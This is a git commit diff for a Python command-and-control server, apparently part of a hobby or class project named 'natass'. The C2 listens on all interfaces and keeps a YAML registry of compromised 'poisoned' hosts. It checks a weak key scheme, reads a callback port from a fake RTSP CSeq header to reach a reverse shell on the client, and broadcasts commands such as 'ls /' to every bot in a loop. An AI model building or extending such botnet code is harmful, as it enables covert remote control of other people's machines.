bb45be35a566ba386806e8f9db807706d0607820
Tensor497 <ikeita@umass.edu>
2024-05-07 12:02:19 -0400

    natass: update the C2 server to handle phony RTSP messages.

--- natass/server/Server.py
+++ natass/server/Server.py
@@ -4,26 +4,56 @@ import time
 import random
 from Werkheiser import Werkheiser
 from Event import Event
+from pathlib import Path
+import yaml
 
 class C2:
     def __init__(self):
+        self.werkheiser_registry = Path('Werkheisers.yml')
         self.events = []
         self.werkheisers = {}
-        self.driver_work = threading.Thread(target=self.irs)
         self.server_socket = None
         self.lock = threading.Lock()
+        self.driver_work = threading.Thread(target=self.irs)
+        self.driver_work.start()
+
+        if self.werkheiser_registry.exists():
+            self.read_werkheisers()
+        else:
+            self.create_werkheisers()
 
         # I don't know much about cryptography and this can be easily broken :P
         # Max or Kyler clutch up, on some gvng shit
         self.key_differences = []
 
         # Shout out if you get the reference :DDDD
-        self.c2_agent_key = 'Hoover MaxExtract PressurePro (Model 60)'
+        self.c2_agent_key = 'Bandits ate my Natass'
         self.c2_nuclear_football = 'G00N13 Opening'
 
         # Calculate the differences.
         for i in range(len(self.c2_agent_key) - 1):
-            self.key_differences.append(ord(self.c2_agent_key[i + i]) - ord(self.c2_agent_key[i]))
+            self.key_differences.append(ord(self.c2_agent_key[i + 1]) - ord(self.c2_agent_key[i]))
+
+    def create_werkheisers(self):
+        with self.werkheiser_registry.open('w') as WK:
+            WK.close() 
+
+    def read_werkheisers(self):
+        self.werkheisers.clear()
+        with self.werkheiser_registry.open('r') as WK:
+            wk_loaded = yaml.safe_load(WK)
+            for k, v in wk_loaded.items():
+                if v not in self.werkheisers:
+                    self.werkheisers[v] = Werkheiser(v)
+            WK.close()
+
+    def save_werkheisers(self):
+        wk_save = {}
+        for i, e in enumerate(self.werkheisers.keys()):
+            wk_save[i] = e
+        with self.werkheiser_registry.open('w') as WK:
+            yaml.dump(wk_save, WK)
+            WK.close()
 
     def get_werkheisers(self):
         # Get all of the Werkheisers.
@@ -32,15 +62,15 @@ class C2:
     def dispatch(self, ips, event):
         # Tell workers with a given IP what to do. Or...
         # First, check if we're playing football.
-        if len(ips) == 1 and self.ips[0] == self.c2_nuclear_football:
+        if len(ips) == 1 and ips[0] == self.c2_nuclear_football:
             # We have our opening... time for the approach.
             print('[+] G00N13 opening detected! Attempting the G00N13 approach...')
 
             # All hands on deck.
             with self.lock:
                 for ip in self.werkheisers.keys():
-                    print(f'[+] Notified {self.werkheisers[id]} to do "{event}"...')
-                    self.werkheisers[ip].queue(event)
+                    print(f'[+] Notified {self.werkheisers[ip]} to do "{event}"...')
+                    self.werkheisers[ip].queue(Event(event))
             return
         
         for ip in ips:
@@ -54,16 +84,16 @@ class C2:
                 self.werkheisers[ip].queue(event)
             
     def authenticate_werkheiser(self, client_key):
-        for i in range(len(self.key_differences)):
-            if (ord(client_key[i + i]) - ord(client_key[i]) != self.key_differences[i]):
+        for i in range(len(self.key_differences) - 1):
+            if (ord(client_key[i + 1]) - ord(client_key[i]) != self.key_differences[i]):
                 return False
         return True
 
     def irs(self):
         # Start a socket
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.server_socket.bind(('127.0.0.1', 23765))
-        self.server_socket.listen()
+        self.server_socket.bind(('0.0.0.0', 23766))
+        self.server_socket.listen(1)
 
         while True:
             # Wait for connection. 
@@ -71,14 +101,33 @@ class C2:
 
             # Once we have a connection, store information.
             (c_address, c_port) = connection_info
+            print('Got a potential client')
 
             # Wait for a sentinel message to make sure we are talking to a poisoned host.
             # Set the timeout to 3 seconds
             c_s.settimeout(3)
 
             # Wait for message
-            message = c_s.recv().decode()
-            if not self.authenticate_werkheiser(message):
+            message = b''
+            message_decoded = ''
+            try:
+                while (c := c_s.recv(0x1)):
+                    message += c
+                    if c == b'\n':
+                        break
+            except socket.timeout:
+                pass
+            
+            try:
+                message_decoded = message.decode()
+            except:
+                print('Bad message... goodbye')
+                time.sleep(2 + random.random() * 10)
+                c_s.close()
+                pass
+
+            if not self.authenticate_werkheiser(message_decoded):
+                print(message_decoded)
                 # Remove them if they are in the address book. Could be someone who got control back.
                 if c_address in self.werkheisers.keys():
                     del self.werkheisers[c_address]
@@ -89,18 +138,45 @@ class C2:
                 # Get this bumass n outta here...
                 c_s.close()
                 continue
-            
+
             with self.lock:
                 # Update address book if not already there.
                 if c_address not in self.werkheisers.keys():
                     self.werkheisers[c_address] = Werkheiser(c_address)
+                    self.save_werkheisers()
 
-                # Forward all of the notifications
-                self.werkheisers[c_address].notify()
-
+            # Read the rest of the message to get the port for the reverse shell
+            try:
+                rtsp_message = c_s.recv(0x1000).decode().strip()
+                rtsp_lines = rtsp_message.split('\n')
+                c_s.close()
+                if len(rtsp_lines) != 2:
+                    raise Exception("LMAO THIS AINT REAL BRUH!")
+                cseq_message = rtsp_lines[1]
+                # Tokenize cseq message.
+                cseq_tokenized = cseq_message.split()
+                if len(cseq_tokenized) != 2 or cseq_tokenized[0] != 'CSeq:':
+                    raise Exception("LMAO BAD CSEQ")
+                port = cseq_tokenized[1]
+                if not port.isnumeric():
+                    raise Exception("LMAO THAT PORT AIN'T GOOD BRUH!")
+                port_int = int(port)
+                if port_int >= 65536:
+                    raise Exception("BRUH YOU TAKE 453???? FOH B")
+                
+                print(f'[+] Connecting to client on port {port_int}...')
+                
+                # Connect to this port to notify to forward all of the notifications
+                self.werkheisers[c_address].notify(port_int)
+            except socket.timeout:
+                print('Disconnected.')
+                pass
             
 def main():
-    ...
+    Server = C2()
+    while True:
+        Server.dispatch(['G00N13 Opening'], "ls /")
+        time.sleep(30)
 
 if __name__ == '__main__':
     main()
